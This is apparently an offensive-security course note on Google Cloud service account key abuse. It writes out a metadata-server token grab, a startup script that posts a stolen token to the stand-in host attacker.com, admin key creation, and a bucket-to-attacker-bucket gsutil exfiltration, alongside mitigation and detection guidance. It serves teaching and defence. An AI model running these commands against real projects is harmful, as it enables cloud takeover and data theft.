---
tags: [gcp, iam, service-account, cloud, privilege-escalation]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.13 GCP IAM"
---

# GCP IAM — Service Account Key Abuse

## 1. Introduction to GCP IAM and Service Accounts
Google Cloud Platform (GCP) Identity and Access Management (IAM) controls access to resources across a GCP organization, folder, or project. While user accounts (identities representing humans) are managed via Google Workspace or Cloud Identity, **Service Accounts** are special accounts used by applications, virtual machines (Compute Engine), and serverless workloads (Cloud Functions/Cloud Run) to interact with GCP APIs.

Service accounts authenticate using RSA key pairs. Google manages the keys for compute resources automatically (via the metadata server), but administrators can also generate **User-Managed Service Account Keys** (JSON files containing the private key) for external applications. The leakage, mismanagement, and abuse of these keys form one of the most critical attack vectors in GCP environments.

## 2. Core Concepts: Roles and Permissions
In GCP, permissions are not granted directly. Permissions are grouped into **Roles**, which are then bound to **Identities** (like a Service Account) via a **Policy** attached to a resource (like a Project).
- **Basic Roles** (Legacy): `Owner`, `Editor`, `Viewer`. These are extremely broad. An `Editor` on a project has thousands of permissions across almost all GCP services.
- **Predefined Roles**: Granular roles created by Google (e.g., `roles/compute.instanceAdmin`).
- **Custom Roles**: User-defined combinations of permissions.

A critical design element in GCP is that a Service Account is both an *Identity* (it can be granted roles to access resources) and a *Resource* (other identities can be granted roles to access or impersonate the service account).

## 3. Attack Vectors: Key Leakage and Access

### 3.1 Hardcoded Keys in Source Code
Developers frequently generate Service Account JSON keys to test applications locally. These keys often end up committed to public or internal Git repositories. Because keys do not expire by default, an attacker discovering a leaked JSON key has persistent, unauthenticated access to the GCP environment with the exact privileges of that service account.

### 3.2 Metadata Server SSRF (Server-Side Request Forgery)
If an attacker finds an SSRF vulnerability in a web application hosted on Google Compute Engine (GCE) or a Cloud Function, they can query the local metadata server to extract the underlying Service Account's temporary OAuth 2.0 token.

```bash
# Exploiting SSRF to hit the GCP Metadata Server
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```
*Unlike AWS IMDSv2, GCP's metadata server relies solely on the `Metadata-Flavor: Google` header for protection, which can often be injected or bypassed in SSRF scenarios.*

### 3.3 Overly Permissive Storage Buckets
Administrators sometimes back up `.json` credential files to Google Cloud Storage (GCS) buckets that are misconfigured with `allUsers` read access.

## 4. Exploitation and Privilege Escalation

Once an attacker possesses a Service Account JSON key or a temporary access token, the exploitation phase begins.

### 4.1 Authenticating to GCP
If the attacker has a JSON key file:
```bash
# Authenticate the gcloud CLI using the leaked key
gcloud auth activate-service-account --key-file=leaked-sa-key.json

# Verify the active account
gcloud auth list
```

If the attacker has an OAuth token (from SSRF):
```bash
# Tokens can be used directly via REST API calls
curl -H "Authorization: Bearer ya29.c.c0A..." \
     "https://cloudresourcemanager.googleapis.com/v1/projects"
```

### 4.2 Reconnaissance
The attacker maps the access level of the compromised Service Account.
```bash
# Find out what project we are in
gcloud config get-value project

# Check the IAM policy for the project to see our roles
gcloud projects get-iam-policy <PROJECT_ID>
```

### 4.3 Privilege Escalation via Impersonation (`iam.serviceAccounts.actAs`)
In GCP, the `roles/iam.serviceAccountUser` role grants the `iam.serviceAccounts.actAs` permission. If a compromised low-privileged Service Account (SA-A) has this role over a high-privileged Service Account (SA-B), SA-A can impersonate SA-B.

**Escalation Path (Compute Engine):**
1. SA-A has `compute.instances.create` and `iam.serviceAccounts.actAs` for SA-B.
2. SA-B has the `roles/editor` role (Project Admin).
3. The attacker (acting as SA-A) creates a new Compute Engine instance and attaches SA-B to it.
4. The attacker runs a startup script on the instance that extracts SA-B's token from the metadata server and sends it to the attacker's C2 server.
5. The attacker now holds an `Editor` token and owns the project.

```bash
gcloud compute instances create "attacker-pivot" \
  --zone="us-central1-a" \
  --service-account="sa-b-high-priv@myproject.iam.gserviceaccount.com" \
  --scopes="https://www.googleapis.com/auth/cloud-platform" \
  --metadata="startup-script=curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST -d @- http://attacker.com/steal"
```

### 4.4 Privilege Escalation via `iam.serviceAccountKeys.create`
If the compromised account has the `roles/iam.serviceAccountKeyAdmin` role, the attacker doesn't even need to use compute resources. They can directly generate a new, permanent JSON key for *any* service account in the project, including the Organization Admin's service account.

```bash
gcloud iam service-accounts keys create pwned-admin.json \
  --iam-account=org-admin@myproject.iam.gserviceaccount.com
```

## 5. Attack Flow and Visual Architecture

```text
+-----------------------------------------------------------------------------------+
|  Reconnaissance & Initial Access                                                  |
|                                                                                   |
|  1. Attacker finds a leaked JSON key in a public GitHub repository.               |
|     (project-dev-sa.json)                                                         |
+---------+-------------------------------------------------------------------------+
          |
          | 2. gcloud auth activate-service-account --key-file=project-dev-sa.json
          v
+---------+-------------------------------------------------------------------------+
|  GCP IAM Evaluation                                                               |
|                                                                                   |
|  * GCP verifies RSA signature of the key.                                         |
|  * Grants access as `dev-worker@myproject.iam.gserviceaccount.com`.               |
|  * Role check: This SA has `roles/compute.admin` and `iam.serviceAccountUser`.    |
+---------+-------------------------------------------------------------------------+
          |
          | 3. Attacker discovers `prod-admin@...` has `roles/owner`
          | 4. Attacker launches VM attaching `prod-admin` SA (actAs abuse)
          v
+---------+-------------------------------------------------------------------------+
|  GCP Compute Engine (Attacker VM)                                                 |
|                                                                                   |
|  * VM boots up. Startup script executes.                                          |
|  * Script queries `http://169.254.169.254/.../token`                              |
|  * Metadata Server returns OAuth token for `prod-admin`.                          |
+---------+-------------------------------------------------------------------------+
          |
          | 5. Token exfiltrated to attacker
          v
+---------+-------------------------------------------------------------------------+
|  Full Project Takeover                                                            |
|  * Attacker uses `prod-admin` token to manipulate firewall rules, dump databases, |
|    and deploy crypto-miners.                                                      |
+-----------------------------------------------------------------------------------+
```

## 6. The Default Compute Engine Service Account Danger
By default, when you enable the Compute Engine API, GCP creates a default service account: `[PROJECT_NUMBER]-compute@developer.gserviceaccount.com`.
Critically, this default account is automatically granted the **`roles/editor`** role on the project. This means any newly spun-up VM that isn't explicitly assigned a restricted service account will have near-administrative control over the entire project. SSRF on a default GCE instance is almost always an instant project takeover.

## 7. Mitigation and Best Practices

### 7.1 Stop Using User-Managed Keys
Rely on **Workload Identity Federation** instead of exporting long-lived JSON keys. Workload Identity allows external identities (like AWS IAM roles, GitHub Actions, or on-prem Active Directory) to authenticate to GCP and receive short-lived OAuth tokens, completely eliminating the need to manage and store static key files.

### 7.2 Disable Default Service Account Grants
Implement the Organization Policy constraint: `constraints/iam.automaticIamGrantsForDefaultServiceAccounts` to prevent default service accounts from automatically receiving the `Editor` role. Always create custom service accounts with least privilege for your workloads.

### 7.3 Restrict Service Account Key Creation
Implement the Organization Policy constraint: `constraints/iam.disableServiceAccountKeyCreation`. This blocks anyone (even administrators) from creating new JSON keys, enforcing the use of Workload Identity or OAuth flows.

### 7.4 Monitor and Rotate
If user-managed keys must be used, implement strict rotation policies. Keys do not expire automatically. Use Cloud Asset Inventory and scripts to identify keys older than 90 days and delete them.

## 8. Detection and Monitoring

### 8.1 Cloud Audit Logs
Monitor Data Access and Admin Activity logs for:
- `google.iam.admin.v1.CreateServiceAccountKey`: Alerts when a new key is generated.
- Unrecognized IP addresses authenticating via Service Account keys (this can be tracked via VPC Service Controls and access logs).

### 8.2 Secret Scanner Integration
Enable Secret Manager or third-party Git integration (like GitGuardian) to immediately alert or block commits containing `type: "service_account"` JSON structures.

### 8.3 Google Cloud Security Command Center (SCC)
SCC provides native detection for anomalies such as "Leaked Credential" (Google actively scans public GitHub for GCP keys and will alert you) and "Anomalous IAM Grant".

## 9. Chaining Opportunities
- **[[02 - SSRF in Cloud Environments]]**: The primary entry point for extracting temporary OAuth tokens from the GCP Metadata Server, leading to Service Account abuse.
- **[[14 - GCP Cloud Storage — Public Bucket Access]]**: Using the compromised service account to list and dump private buckets across the project.
- **[[28 - CI/CD Pipeline Attacks]]**: Compromising a GitLab runner or GitHub Action that holds a Service Account key as a repository secret, granting access to the GCP environment.

## 10. Related Notes
- [[12 - AWS IAM Privilege Escalation]]
- [[03 - Secrets Management in Cloud]]
- [[34 - Kubernetes Security (GKE)]]

## 11. Cross-Project and Folder Lateral Movement
Service Accounts often have permissions that span across multiple projects or even entire Folders. If an attacker compromises a key for a Service Account used in a shared CI/CD pipeline, that single account might have `roles/artifactregistry.writer` in the `Dev` project, but also `roles/compute.viewer` in the `Prod` project.

To map these permissions effectively, an attacker might use tools like `gcp_enum` or native `gcloud` asset inventory queries:
```bash
# Search for all IAM policies where our compromised service account has a role
gcloud asset search-all-iam-policies \
  --scope=organizations/123456789012 \
  --query="policy:compromised-sa@myproject.iam.gserviceaccount.com"
```
This query reveals the blast radius of the compromised key across the entire GCP organization, enabling the attacker to pivot from a low-value project directly into critical production environments.

## 12. Exfiltration via Cloud Storage API
Once a Service Account key is abused, one of the fastest methods of data exfiltration is leveraging the `roles/storage.objectAdmin` role to copy massive datasets out of the GCP environment directly to an attacker-controlled GCS bucket.

```bash
# Using the compromised Service Account to authenticate gsutil
gcloud auth activate-service-account --key-file=leaked-key.json

# Exfiltrating data directly from the victim's bucket to the attacker's bucket
# This is incredibly fast as the data transfer happens entirely over Google's backbone network,
# bypassing corporate firewalls and egress monitoring.
gsutil -m rsync -r gs://victim-sensitive-data gs://attacker-controlled-bucket
```
This technique avoids triggering network IDS/IPS systems because the traffic never traverses the public internet; it remains entirely within GCP.

## 13. Securing CI/CD Pipelines
Service Account keys are overwhelmingly leaked via CI/CD platforms (GitHub Actions, GitLab CI, Jenkins). To mitigate this:
1. **Never store JSON keys as repository secrets.**
2. **Use Workload Identity Federation for GitHub Actions**: Configure GCP to trust the OIDC token issued by GitHub. The pipeline will authenticate natively without ever needing a long-lived credential file.
3. If Workload Identity is not possible, use a centralized secrets manager (like HashiCorp Vault) to dynamically generate and revoke GCP credentials per pipeline run.
